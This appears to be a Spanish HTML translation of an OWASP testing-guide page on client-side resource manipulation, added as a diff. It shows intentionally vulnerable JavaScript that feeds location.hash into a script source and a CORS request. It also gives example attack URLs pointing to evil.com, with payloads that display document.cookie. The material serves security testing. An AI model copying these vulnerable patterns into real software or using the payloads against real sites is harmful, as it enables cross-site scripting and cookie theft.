@@ -1,0 +1,102 @@
+<h1 id="client-side-resource-manipulation">Manipulación de recursos del lado del cliente</h1>
+<div class="tabla"><table><thead><tr>
+<th>ID</th>
+</tr>
+</thead><tbody><tr>
+<td>WSTG-CLNT-06</td>
+</tr>
+</tbody></table></div>
+<h2 id="summary">Resumen</h2>
+<p>Una vulnerabilidad de manipulación de recursos del lado del cliente es un fallo de validación de entrada. Ocurre cuando una aplicación acepta entrada controlada por el usuario que especifica la ruta de un recurso, como el origen de un iframe, de JavaScript, de un applet o el manejador de un XMLHttpRequest. Esta vulnerabilidad consiste en la capacidad de controlar las URLs que enlazan con algunos recursos presentes en una página web. El impacto de esta vulnerabilidad varía y suele emplearse para realizar ataques de XSS. Esta vulnerabilidad permite interferir con el comportamiento esperado de la aplicación haciendo que cargue y renderice objetos maliciosos.</p>
+<p>El siguiente código JavaScript muestra un posible script vulnerable en el que un atacante puede controlar <code>location.hash</code> (fuente), que llega al atributo <code>src</code> de un elemento script. Este caso particular conduce a un ataque de XSS, ya que podría inyectarse JavaScript externo.</p>
+<pre><code class="language-html">&lt;script&gt;
+    var d=document.createElement(&quot;script&quot;);
+    if(location.hash.slice(1)) {
+        d.src = location.hash.slice(1);
+    }
+    document.body.appendChild(d);
+&lt;/script&gt;
+</code></pre>
+<p>Un atacante podría dirigirse a una víctima haciendo que visite esta URL:</p>
+<p><code>www.victim.com/#https://evil.com/js.js</code></p>
+<p>Donde <code>js.js</code> contiene:</p>
+<pre><code class="language-js">alert(document.cookie)
+</code></pre>
+<p>Esto haría que la alerta aparezca en el navegador de la víctima.</p>
+<p>Un escenario más dañino implica la posibilidad de controlar la URL invocada en una petición CORS. Dado que CORS permite que el recurso de destino sea accesible por el dominio solicitante mediante un enfoque basado en cabeceras, el atacante puede pedir a la página objetivo que cargue contenido malicioso desde su propio sitio web.</p>
+<p>Este es un ejemplo de una página vulnerable:</p>
+<pre><code class="language-html">&lt;b id=&quot;p&quot;&gt;&lt;/b&gt;
+&lt;script&gt;
+    function createCORSRequest(method, url) {
+        var xhr = new XMLHttpRequest();
+        xhr.open(method, url, true);
+        xhr.onreadystatechange = function () {
+            if (this.status == 200 &amp;&amp; this.readyState == 4) {
+                document.getElementById(&#39;p&#39;).innerHTML = this.responseText;
+            }
+        };
+        return xhr;
+    }
+
+    var xhr = createCORSRequest(&#39;GET&#39;, location.hash.slice(1));
+    xhr.send(null);
+&lt;/script&gt;
+</code></pre>
+<p>El <code>location.hash</code> está controlado por la entrada del usuario y se utiliza para solicitar un recurso externo, que luego se refleja mediante la construcción <code>innerHTML</code>. Un atacante podría pedir a una víctima que visite la siguiente URL:</p>
+<p><code>www.victim.com/#https://evil.com/html.html</code></p>
+<p>Con el manejador del payload para <code>html.html</code>:</p>
+<pre><code class="language-html">&lt;?php
+header(&#39;Access-Control-Allow-Origin: https://www.victim.com&#39;);
+?&gt;
+&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+</code></pre>
+<h2 id="test-objectives">Objetivos de la prueba</h2>
+<ul>
+<li>Identificar sinks con validación de entrada débil.</li>
+<li>Evaluar el impacto de la manipulación de recursos.</li>
+</ul>
+<h2 id="how-to-test">Cómo probar</h2>
+<p>Para comprobar manualmente este tipo de vulnerabilidad, hay que identificar si la aplicación emplea entradas sin validarlas correctamente. De ser así, estas entradas están bajo el control del usuario y podrían usarse para especificar recursos externos. Dado que hay muchos recursos que podrían incluirse en la aplicación (como imágenes, video, objetos, CSS e iframes), se deben investigar los scripts del lado del cliente que manejan las URLs asociadas en busca de posibles problemas.</p>
+<p>La siguiente tabla muestra los posibles puntos de inyección (sink) que se deben comprobar:</p>
+<div class="tabla"><table><thead><tr>
+<th>Tipo de recurso</th>
+<th>Etiqueta/Método</th>
+<th>Sink</th>
+</tr>
+</thead><tbody><tr>
+<td>Frame</td>
+<td>iframe</td>
+<td>src</td>
+</tr>
+<tr>
+<td>Enlace</td>
+<td>a</td>
+<td>href</td>
+</tr>
+<tr>
+<td>Petición AJAX</td>
+<td><code>xhr.open(method, [url], true);</code></td>
+<td>URL</td>
+</tr>
+<tr>
+<td>CSS</td>
+<td>link</td>
+<td>href</td>
+</tr>
+<tr>
+<td>Imagen</td>
+<td>img</td>
+<td>src</td>
+</tr>
+<tr>
+<td>Objeto</td>
+<td>object</td>
+<td>data</td>
+</tr>
+<tr>
+<td>Script</td>
+<td>script</td>
+<td>src</td>
+</tr>
+</tbody></table></div>
+<p>Los más interesantes son aquellos que permiten a un atacante incluir código del lado del cliente (por ejemplo JavaScript) que podría conducir a vulnerabilidades de XSS.</p>
